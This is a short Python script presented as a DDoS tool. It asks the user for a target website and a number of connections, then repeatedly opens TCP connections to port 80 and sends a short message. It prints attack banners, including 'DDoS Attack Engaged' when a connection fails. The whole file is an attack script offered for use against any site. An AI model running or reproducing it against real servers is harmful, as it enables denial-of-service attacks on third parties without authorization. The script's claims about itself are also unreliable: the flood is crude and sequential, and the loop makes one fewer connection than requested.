import socket
import os
import sys


def restart_program():
    # Retrieves the path to the Python interpreter currently running this script
    python = sys.executable
    # Replaces the current process with a new instance of Python with the same script
    os.execl(python, python, * sys.argv)


def dos(host, ip):
    # Creating a TCP socket
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    message = "Hello World"
    # Using port 80 ( HTTP )
    port = 80

    # Attempting to connect to the host at the specified port
    try:
        # Connecting to the specified host and port
        ddos.connect((host, port))
        # Sending a message using different methods
        ddos.send(message.encode())
        ddos.sendto(message.encode(), (ip, port))
        ddos.send(message.encode())
    except socket.error as msg:
        # Handling connection errors if they occur
        print("|     [Connection Failed]    |")
        print("|    [DDoS Attack Engaged]    |")

    # Closing the socket
    ddos.close()


def main():
    print("DDoS Mode Loaded")

    host = input("Site you want to DDoS:")
    conn = int(input("How many connections you want to make:"))

    ip = socket.gethostbyname(host)
    print("[" + ip + "]")
    print("[ Ip is locked ]")
    print("[ Attacking " + host + " ]")

    print("+----------------------------+")

    for i in range(1, conn):
        dos(host, ip)

    print("+----------------------------+")
    print("The connections you requested had finished")


# Call the main function to start the DDoS Attack
main()

# Handle restart program
answer = input("Do you want to ddos more?")
if answer.strip() in "y Y yes Yes YES".split():
    restart_program()
else:
    exit()
